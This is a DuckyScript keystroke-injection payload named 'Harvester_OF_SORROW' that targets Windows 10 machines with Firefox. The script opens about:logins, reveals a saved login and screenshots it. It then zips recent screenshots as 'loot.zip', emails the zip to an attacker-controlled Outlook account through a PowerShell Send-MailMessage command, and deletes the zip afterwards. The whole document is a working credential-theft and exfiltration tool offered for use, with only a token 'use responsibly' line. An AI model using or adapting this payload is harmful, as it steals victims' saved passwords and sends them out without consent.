REM_BLOCK
Title: Harvester_OF_SORROW
Author: LulzAnarchyAnon
Description: This payload is a long, hard work around to bypass Microsoft Security in Firefox where a pin, or password is required to export saved log in credentials.

The payload opens firefox about:logins, and tabs, and arrows its way through options. It then takes a screen shot with the first set of log in credentials made visible. Finally it sends the screenshot to an email of your choosing.

Target: Windows 10, PowerShell & Mozilla Firefox
Props: Darren Kitchen, KARROTKAK3, I am Jakoby and the-jcksn

Version: 1.0
Category: Credentials (OMG)

Payload DELAYS,TABS AND ARROWS may need to be ajusted depending on target system speeds. 
After email aqusition you will be able to adjust DELAYS,TABS AND ARROWS to harvest other creds from the email screen shot.

You must change the USER_EMAIL and USER_PASSWORD to your outlook credentials.
Can exfil more than 5, but I chose 5 to keep file sizes low.
Can exfil from directory other than screenshots by changing path.
You might have to adjust the delays, depending on the target machine, but these worked ok for me.
Use responsibly, and within the confines of the law.
END_REM

DEFINE #USER_EMAIL user@example.com
DEFINE #USER_PASSWORD supersecretpassword

DUCKY_LANG US
DELAY 2000
DEFAULT_DELAY 200
GUI r
STRINGLN firefox about:logins
DELAY 1000
REPEAT 10 TAB
DELAY 1000
SHIFT SPACE
DELAY 5000
PRINTSCREEN
DELAY 5000
GUI r
STRINGLN powershell -windowstyle hidden
DELAY 2000
STRINGLN mspaint
DELAY 5000
CTRL v
DELAY 2000
CTRL s
REPEAT 11 TAB
RIGHTARROW
DOWNARROW
REPEAT 2 RIGHTARROW
TAB
ENTER
REPEAT 2 CTRL RIGHTARROW
REPEAT 13 TAB
REPEAT 2 RIGHTARROW
ENTER
TAB
ENTER
DELAY 1000
ALT f
ALT X
ALT f
X
DELAY 2000
GUI r
REM navigating to the directory to exfil from - change the following if you do not want the latest screenshots
STRINGLN %USERPROFILE%\Pictures\Screenshots
REM sorting the files by date
SHIFT F10
STRING o
DOWNARROW
ENTER
REM selecting files to exfil, repeat this line if you want more than 5, but bear in mind this might impact some of the delays
REPEAT 4 SHIFT RIGHTARROW
REM sending files to loot.zip
SHIFT F10
STRING n
DOWNARROW
ENTER
DELAY 500
STRINGLN loot
ALT F4
GUI r
REM open powershell and send the email
STRINGLN powershell
DELAY 500
REM ~~~~~~~CHANGE THE USERNAME (3 times) AND PASSWORD (once) IN THE FOLLOWING~~~~~
STRINGLN Send-MailMessage -From #USER_EMAIL -To #USER_EMAIL -Subject "Photo loot" -Body "Please find attached your zip file" -Attachment "Pictures\Screenshots\loot.zip" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #USER_EMAIL, (ConvertTo-SecureString -String "#USER_PASSWORD" -AsPlainText -Force))
DELAY 500
REM cleanup
STRINGLN del Pictures\Screenshots\loot.zip
STRINGLN exit